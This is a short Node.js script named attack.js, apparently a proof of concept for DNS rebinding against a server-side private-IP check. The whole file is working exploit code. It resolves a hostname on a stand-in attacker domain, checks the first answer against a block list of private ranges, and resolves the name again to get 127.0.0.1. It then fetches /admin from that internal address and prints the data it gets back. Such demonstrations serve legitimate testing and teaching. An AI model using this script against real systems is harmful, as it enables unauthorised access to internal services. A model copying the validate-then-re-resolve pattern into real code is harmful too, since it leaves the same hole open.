// attack.js
const dns = require('dns');
const dnsPromises = dns.promises;
const axios = require('axios');
const { URL } = require('url');

dns.setServers(['127.0.0.1:5333']);

const BLOCKED_RANGES = [
  /^127\./,
  /^10\./,
  /^192\.168\./,
  /^172\.(1[6-9]|2\d|3[01])\./,
  /^169\.254\./,
  /^::1$/,
  /^0\.0\.0\.0$/,
];

const isPrivateIP = (ip) => BLOCKED_RANGES.some(r => r.test(ip));

async function exploit() {
  const target = 'http://rebind.evil.com:8888/admin';
  const parsed = new URL(target);

  // First resolution — validation
  const first = await dnsPromises.resolve4(parsed.hostname);
  console.log('[VALIDATE] resolved to:', first);

  for (const address of first) {
    if (isPrivateIP(address)) {
      throw new Error(`Blocked: ${address} is private`);
    }
  }
  console.log('[*] Validation passed!');

  // Second resolution — attack (DNS server now returns 127.0.0.1)
  const second = await dnsPromises.resolve4(parsed.hostname);
  console.log('[ATTACK] resolved to:', second);

  // Build URL using the resolved IP directly
  const attackURL = `http://${second[0]}:8888/admin`;
  console.log('[*] Requesting:', attackURL);

  const response = await axios.get(attackURL);
  console.log('[+] GOT INTERNAL DATA:', response.data);
}

exploit().catch(e => console.log('[-] Failed:', e.message));
